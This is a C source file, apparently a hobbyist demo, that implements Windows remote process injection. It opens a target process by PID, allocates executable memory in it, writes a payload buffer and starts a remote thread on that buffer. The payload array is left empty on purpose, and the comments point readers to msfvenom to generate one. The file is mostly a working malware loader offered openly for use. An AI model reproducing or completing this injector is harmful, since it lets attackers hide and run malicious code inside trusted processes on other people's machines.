/*

    'Sup? Today we code a windows exclusive program...
    So what is today's fuckery? creating a process injection lol

    ofc this is a concept demo and skeleton I won't give you a fucking payload to use

    so what's process injection?
    in the most basic form it is using a trusted process to run our payload 
    simply allocate buffer within program, copy the payload, then exec  
*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char payload[] = { 0 };    //Nuh uh script kiddies I ain't giving you a real payload go pke ıne of your fancy kali tools
//starting with msfvenom

size_t pl_size = sizeof(payload);  //size for allocation

int main(int argc, char *argv[])
{
    if (argc != 2) {
        printf("gimme a proc ID\n");        //yeah hand still broken so I am just half-assing this file
        goto rome;
    }

    int rc = atoi(argv[1]);
    if (!rc) {
        printf("atoi shit itself\n");
        goto rome;
    }
    
    HANDLE proc_handle; // Handle for the target proc
    HANDLE remote_thread; // Handle for the remote thread
    PVOID remote_buf; // Buffer in the target proc
    
    printf("Target Proc id: %i\n", rc);
    
    proc_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)rc);
    remote_buf = VirtualAllocEx(proc_handle, NULL, pl_size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    
    WriteProcessMemory(proc_handle, remote_buf, payload, pl_size, NULL);
    
    remote_thread = CreateRemoteThread(proc_handle, NULL, 0, (LPTHREAD_START_ROUTINE)remote_buf, NULL, 0, NULL);    
    
    CloseHandle(proc_handle);

rome:
    return(0);

        //This indded does compile but I don't have win*ows (thx god) so...rest upon you guys 
}